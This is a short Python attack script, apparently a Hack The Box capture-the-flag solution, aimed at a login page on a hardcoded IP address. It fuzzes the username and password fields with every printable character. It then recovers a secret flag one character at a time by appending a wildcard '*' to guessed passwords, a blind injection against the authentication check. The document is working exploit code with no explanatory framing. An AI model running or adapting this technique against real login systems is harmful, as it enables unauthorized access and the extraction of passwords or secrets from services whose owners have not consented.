import requests
import string
import sys
from Brute import *
from Helpers import *

CURSOR_UP_ONE = '\033[F' 
ERASE_LINE = '\033[K' 
TARGET_URL='http://46.101.23.188:31164'

def fuzz():
    normalResUrl=TARGET_URL+'/login?message=Authentication%20failed'
    normalStatus=200
    for ch in string.printable:
        data={
            "username":f"{ch}",
            "password":f"{ch}"
        }
        sys.stdout.write("Testing "+data['username']+'\r')
        sys.stdout.flush()
        sys.stdout.write(ERASE_LINE)
        res=requests.post(TARGET_URL+'/login',data=data)
        if(res.status_code!=normalStatus or res.url!=normalResUrl):
            print(f"{ch} - {res.status_code} - {res.url}")


def compareChar(ch,flag):
    ch=flag+ch+"*"
    #print(ch)
    normalResUrl=TARGET_URL+'/'
    normalStatus=200
    data={
        "username":"Reese",
        "password":ch
    }
    res=requests.post(TARGET_URL+'/login',data=data)
    if(res.status_code==normalStatus and res.url==normalResUrl):
        return True
    else:
        return False


def Main():
    flag='HTB{d1rectory'
    for i in range(0,30):
        for ch in string.printable:
            if ch=="*":
                continue
            sys.stdout.write("Testing "+flag+ch+'\r')
            sys.stdout.flush()
            sys.stdout.write(ERASE_LINE)
            if compareChar(ch,flag):
                flag=flag+ch
                break
        if flag[-1]=="}":
            break

Main()